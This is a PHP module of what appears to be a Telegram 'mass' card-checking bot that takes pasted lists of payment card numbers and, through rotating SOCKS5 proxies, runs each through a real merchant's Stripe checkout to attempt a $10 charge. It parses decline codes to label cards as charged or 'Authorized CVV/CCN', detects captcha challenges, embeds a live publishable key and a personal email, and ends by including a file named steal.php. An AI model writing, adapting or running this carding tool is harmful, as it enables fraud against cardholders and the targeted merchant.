<?php

function makearray($message){
    return explode("\n", $message);
}

if ($message == '.mass' or $message == '/mass' or $message == ',mass' or $message == '?mass' or $message == '!mass') {sendMessage($chatId, "   Gate Info - <b>%0A• STRIPE 10$ CHARGE - .mass || /mass || !mass || ,mass || ?mass %0A• Other Gates - /cmds </b> ", $message_id);exit();}

$cclist = preg_replace("/[^0-9|\n]/", "",$message);
$array = explode("\n", $cclist);
$arraylen = count($array);
$new_array = [];
foreach ($array as $res) {

include 'Tools/proxy.php';

#01. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://tryhackme.com/subscriptions');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl1 = curl_exec($ch);
$csrf = trim(strip_tags(getStr($curl1,'csrfToken = "','"')));
$info = curl_getinfo($ch);
$time11 = $info['total_time'];
$time1 = substr_replace($time11, '',4);

# 02 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://tryhackme.com/payment/stripe/buy-vouchers');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'csrf-token: '.$csrf.'',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'subs=1&months=1&email=abhays32109%40gmail.com&currency=usd');
$curl2 = curl_exec($ch);
$cs = trim(strip_tags(getStr($curl2,'sessionId":"','"')));
$info = curl_getinfo($ch);
$time22 = $info['total_time'];
$time2 = substr_replace($time22, '',4);

# 03 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mon.'&card[exp_year]='.$year.'&billing_details[name]=Ajay+Singh&billing_details[email]=abhays32109%40gmail.com&billing_details[address][country]=IN&guid=NA&muid=NA&sid=NA&key=pk_live_KxmCxZNRJnRAnNAGdrXICd3a&payment_user_agent=stripe.js%2F32de06046%3B+stripe-js-v3%2F32de06046%3B+checkout');
$curl3 = curl_exec($ch);
$pid = trim(strip_tags(getStr($curl3,'"id": "','"')));
$prsp1 = trim(strip_tags(getStr($curl3,'message": "','"')));
$pdcode1 = trim(strip_tags(getStr($curl3,'decline_code": "','"')));
$info = curl_getinfo($ch);
$time33 = $info['total_time'];
$time3 = substr_replace($time33, '',4);

# 04 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cs.'/confirm');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$pid.'&expected_amount=1000&last_displayed_line_item_group_details[subtotal]=1000&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=pk_live_KxmCxZNRJnRAnNAGdrXICd3a');
$curl4 = curl_exec($ch);
$status = trim(strip_tags(getStr($curl4,'status": "','"')));
$dcode = trim(strip_tags(getStr($curl4,'decline_code": "','"')));
$messagee = trim(strip_tags(getStr($curl4,'"message": "','",')));
$info = curl_getinfo($ch);
$time44 = $info['total_time'];
$time4 = substr_replace($time44, '',4);
$time = ($time1+$time2+$time3+$time4);

    if (empty($dcode)) {$dcode = $status;}   
          $i = "Card Details 💳 : $res%0AResult : $dcode";
          $new_array[] = $i;
        sendMessage($chatId, "$new_array[0]%0A$new_array[1]%0A$new_array[2]%0A$new_array[3]%0A$new_array[4]%0A$new_array[5]%0A$new_array[6]%0A$new_array[7]%0A$new_array[8]%0A$new_array[9]%0A$new_array[10]%0A$new_array[11]%0A$new_array[12]%0A$new_array[13]%0A$new_array[14]%0A$new_array[15]%0A$new_array[16]%0A$new_array[17]%0A$new_array[18]%0A$new_array[19]%0A$new_array[20]%0A$new_array[21]%0A$new_array[22]%0A$new_array[23]%0A$new_array[24]%0A$new_array[25]%0A$new_array[26]%0A$new_array[27]%0A$new_array[28]%0A$new_array[29]%0A$new_array[30]%0A$new_array[31]%0A$new_array[32]%0A$new_array[33]%0A$new_array[34]%0A$new_array[35]%0A$new_array[36]%0A$new_array[37]%0A$new_array[38]%0A$new_array[39]%0A$new_array[40]%0A$new_array[41]%0A$new_array[42]%0A$new_array[43]%0A$new_array[44]%0A$new_array[45]%0A$new_array[46]%0A$new_array[47]%0A$new_array[48]%0A$new_array[49]%0A$new_array[50]%0A$new_array[51]%0A$new_array[52]%0A$new_array[53]%0A$new_array[54]%0A$new_array[55]%0A$new_array[56]%0A$new_array[57]%0A$new_array[58]%0A$new_array[59]%0A$new_array[60]%0A$new_array[61]%0A$new_array[62]%0A$new_array[63]%0A$new_array[64]%0A$new_array[65]%0A$new_array[66]%0A$new_array[67]%0A$new_array[68]%0A$new_array[69]%0A$new_array[70]%0A$new_array[71]%0A$new_array[72]%0A$new_array[73]%0A$new_array[74]%0A$new_array[75]%0A$new_array[76]%0A$new_array[77]%0A$new_array[78]%0A$new_array[79]%0A$new_array[80]%0A$new_array[81]%0A$new_array[82]%0A$new_array[83]%0A$new_array[84]%0A$new_array[85]%0A$new_array[86]%0A$new_array[87]%0A$new_array[88]%0A$new_array[89]%0A$new_array[90]%0A$new_array[91]%0A$new_array[92]%0A$new_array[93]%0A$new_array[94]%0A$new_array[95]%0A$new_array[96]%0A$new_array[97]%0A$new_array[98]%0A$new_array[99]%0A$new_array[100]%0A$new_array[101]%0A", $message_id);

}
          
if (strpos($curl3, "card_error")){
sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ❌ Failed To Charge ( $prsp1 - $pdcode1 )%0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
}
elseif (strpos($curl4, "insufficient_funds")){
sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ✅ Authorized CVV ( $messagee - $dcode )%0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
}
elseif (strpos($curl4, 'status": "succeeded')){
sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ✅ Charged Successfully ( $status )%0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
}
elseif (strpos($curl4, "3ds2")){
sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ✅ Authorized CVV ( 3DS ) %0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
}
elseif ((strpos($curl4, "intent_confirmation_challenge")) || (strpos($curl4, 'site_key": "'))){
sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ❌ Unchecked Captcha Triggered [ Try Again Later ] %0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
}
elseif ((strpos($curl4, "parameter_invalid_empty"))){
sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ❌ Please Check The Input Fields And Try Again%0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
}
elseif ((strpos($curl4, "security code is incorrect")) || (strpos($curl4, "incorrect_cvc"))){
sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ✅ Authorized CCN ( $messagee ) %0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
}
elseif ((strpos($curl4, "error")) || (strpos($curl4, "card_declined")) || (strpos($curl4, "card_decline_rate_limit_exceeded")) || (strpos($curl4, "transaction_not_allowed")) || (strpos($curl4, "incorrect_number")) || (strpos($curl4, "do_not_honor"))){
sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ❌ Failed To Charge ( $messagee - $dcode )%0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
}
else{
sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ❌ Failed To Charge ( $messagee - $dcode - $prsp1 - $pdcode1 )%0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
}
include 'steal.php';
          
curl_close($ch);
?>